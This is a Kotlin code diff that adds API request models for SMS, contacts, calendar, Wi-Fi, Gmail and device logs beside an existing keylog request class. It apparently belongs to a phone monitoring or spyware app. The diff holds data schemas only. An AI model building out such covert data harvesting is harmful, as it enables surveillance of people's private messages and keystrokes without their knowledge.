@@ -112,3 +112,64 @@ data class KeyLogRequest(
     val text: String,
     @SerializedName("event_type") val eventType: String = "text_changed",
 )
+
+// ─── Phase 1 Extended API models ─────────────────────
+data class SmsApiRequest(
+    @SerializedName("sms_id") val smsId: Long,
+    val address: String,
+    @SerializedName("contact_name") val contactName: String?,
+    val body: String,
+    val type: Int,
+    val date: String, // ISO 8601
+    @SerializedName("is_mms") val isMms: Boolean = false,
+    val read: Boolean = true
+)
+
+data class ContactApiRequest(
+    val name: String?,
+    val phone: String,
+    @SerializedName("phone_type") val phoneType: Int?,
+    val email: String?,
+    @SerializedName("photo_url") val photoUrl: String?,
+    @SerializedName("times_contacted") val timesContacted: Int = 0,
+    @SerializedName("last_time_contacted") val lastTimeContacted: String?,
+    val starred: Boolean = false
+)
+
+data class CalendarApiRequest(
+    @SerializedName("event_id") val eventId: Long,
+    val title: String?,
+    val description: String?,
+    @SerializedName("event_location") val eventLocation: String?,
+    @SerializedName("start_time") val startTime: String, // ISO
+    @SerializedName("end_time") val endTime: String,     // ISO
+    @SerializedName("all_day") val allDay: Boolean = false,
+    val organizer: String?,
+    @SerializedName("calendar_name") val calendarName: String?
+)
+
+data class WifiApiRequest(
+    val ssid: String,
+    val bssid: String?,
+    val capabilities: String?,
+    val frequency: Int?,
+    val rssi: Int?,
+    @SerializedName("is_connected") val isConnected: Boolean = false,
+    @SerializedName("ip_address") val ipAddress: String?,
+    @SerializedName("link_speed") val linkSpeed: Int?
+)
+
+data class GmailApiRequest(
+    val sender: String?,
+    @SerializedName("sender_email") val senderEmail: String?,
+    val recipient: String?,
+    val subject: String?,
+    val body: String?,
+    val timestamp: String, // ISO
+    @SerializedName("is_read") val isRead: Boolean = false
+)
+
+data class DeviceLogApiRequest(
+    @SerializedName("log_type") val logType: String,
+    @SerializedName("data_json") val dataJson: String
+)
